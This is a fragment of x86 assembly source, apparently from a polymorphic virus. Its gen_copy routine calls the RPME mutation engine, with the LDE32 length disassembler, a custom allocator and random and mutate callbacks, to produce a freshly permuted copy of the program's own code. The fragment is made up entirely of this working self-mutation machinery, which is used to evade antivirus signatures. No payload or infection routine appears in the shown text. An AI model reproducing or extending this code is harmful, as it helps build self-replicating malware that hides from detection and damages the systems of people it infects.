
; generate new polymorphic copy (call RPME)

; resulting buffer    -- buf
; size                -- buf_size
; relative entrypoint -- buf_entry

gen_copy:               pusha
                        cld

                        seh_init

                        push    offset ldetbl   ; initialize LDE32
                        call    disasm_init     ; LDE32BIN.INC

                        mov     mem_count, 0    ; for my_malloc

                        mov     buf_size, CODESIZE

                        pusho   init            ; EAX<--relative entrypoint
                        pop     eax
                        sub     eax, offset start

                        pusho   my_malloc       ; malloc
                        pusho   my_disasm       ; disasm opcode
                        pusho   my_mutate       ; see usermut.inc
                        pusho   my_rnd          ; randomer
                        push    15              ; jmp-prob
                        push    0               ; extrelfix
                        push    0               ; ofiller (-1=xparent)
                        push    offset buf_entry; *oentry
                        push    buf_size        ; osize
                        push    buf_ptr         ; obuf
                        push    eax             ; ientry
                        push    CODESIZE        ; isize
                        push    offset start    ; ibuf
                        call    engine

                        or      eax, eax
                        jnz     __error

                        clc

__exit:                 seh_done

                        popa
                        ret

__error:                stc
                        jmp     __exit
                        
; cdecl BYTE* malloc(DWORD size)

my_malloc:              mov     eax, [esp+4]
                        add     eax, mem_count
                        cmp     eax, MAXMEM
                        jae     __error
                        xchg    mem_count, eax
                        add     eax, mem_ptr
                        ret
__error:                xor     eax, eax
                        ret

; LDE32 interface
; cdecl int disasm(BYTE* opcode)

my_disasm:              push    dword ptr [esp+4]
                        push    offset ldetbl
                        call    disasm_main             ; LDE32BIN.INC
                        ret

